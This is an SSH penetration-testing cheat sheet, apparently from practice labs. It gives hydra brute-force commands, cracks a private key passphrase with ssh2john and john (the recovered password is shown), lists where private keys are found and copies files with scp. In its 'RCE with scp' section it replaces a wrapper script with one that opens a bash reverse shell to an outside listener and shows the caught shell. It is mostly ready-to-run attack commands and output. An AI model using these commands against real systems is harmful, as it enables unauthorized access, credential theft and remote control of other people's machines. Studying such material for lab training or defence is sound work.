# SSH Checklist

##### Log in with credentials or brute force with hydra

````
hydra -l userc -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.27 -t 4 ssh
hydra -L users.txt -p WallAskCharacter305 192.168.153.139 -t 4 ssh -s 42022
````

##### Private key obtained
````
chmod 600 id_rsa
ssh userb@172.16.138.14 -i id_rsa
````

##### Cracking Private Key
````
ssh2john id_ecdsa > id_ecdsa.hash

cat id_ecdsa.hash 
id_ecdsa:$sshng$6$16$0ef9e445850d777e7da427caa9b729cc$359$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000100ef9e445850d777e7da427caa9b729cc0000001000000001000000680000001365636473612d736861322d6e69737470323536000000086e697374703235360000004104afad8408da4537cd62d9d3854a02bf636ce8542d1ad6892c1a4b8726fbe2148ea75a67d299b4ae635384c7c0ac19e016397b449602393a98e4c9a2774b0d2700000000b0d0768117bce9ff42a2ba77f5eb577d3453c86366dd09ac99b319c5ba531da7547145c42e36818f9233a7c972bf863f6567abd31b02f266216c7977d18bc0ddf7762c1b456610e9b7056bef0affb6e8cf1ec8f4208810f874fa6198d599d2f409eaa9db6415829913c2a69da7992693de875b45a49c1144f9567929c66a8841f4fea7c00e0801fe44b9dd925594f03a58b41e1c3891bf7fd25ded7b708376e2d6b9112acca9f321db03ec2c7dcdb22d63$16$183

john --wordlist=/usr/share/wordlists/rockyou.txt id_ecdsa.hash

fireball         (id_ecdsa)
````

##### Finding Private keys
````
/etc/ssh/*pub #Use this to view the type of key you have aka (ecdsa)

ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@example01
````
````
/home/userE/.ssh/id_ecdsa.pub #public key
/home/userE/.ssh/id_ecdsa #private key
````

##### Errors
this means no password! Use it to login as a user on the box
````
ssh2john id_rsa > id_rsa.hash             
id_rsa has no password!
````
This means you are most likely using the private key for the wrong user, try doing a cat /etc/passwd in order to find other users to try it on. This error came from me trying a private key on the wrong user and private key which has no password asking for a password
````
ssh root@192.168.214.125 -p43022 -i id_rsa  
Warning: Identity file id_rsa not accessible: No such file or directory.
The authenticity of host '[192.168.214.125]:43022 ([192.168.214.125]:43022)' can't be established.
ED25519 key fingerprint is SHA256:rNaauuAfZyAq+Dhu+VTKM8BGGiU6QTQDleMX0uANTV4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.214.125]:43022' (ED25519) to the list of known hosts.
root@192.168.214.125's password: 
Permission denied, please try again.
root@192.168.214.125's password: 
Permission denied, please try again.
root@192.168.214.125's password: 
root@192.168.214.125: Permission denied (publickey,password).

````

##### Downloading files
````
scp -r -i id_rsa USERZ@192.168.214.149:/path/to/file/you/want .
````

##### RCE with scp
````
kali@kali:~/home/userA$ cat scp_wrapper.sh 
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac
````
````
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    bash -i >& /dev/tcp/192.168.18.11/443 0>&1
    ;;
esac
````
````
scp -i .ssh/id_rsa scp_wrapper.sh userA@192.168.120.29:/home/userA/
````
````
kali@kali:~$ sudo nc -nlvp 443
````
````
kali@kali:~/home/userA$ ssh -i .ssh/id_rsa userA@192.168.120.29
PTY allocation request failed on channel 0
ACCESS DENIED.
````
````
connect to [192.168.118.11] from (UNKNOWN) [192.168.120.29] 48666
bash: cannot set terminal process group (932): Inappropriate ioctl for device
bash: no job control in this shell
userA@sorcerer:~$ id
id
uid=1003(userA) gid=1003(userA) groups=1003(userA)
userA@sorcerer:~$
````

##### sshpass

If ssh doesn’t work, try sshpass:

````
sshpass -p passwrd ssh Brian.moore@pstcish.offsec
````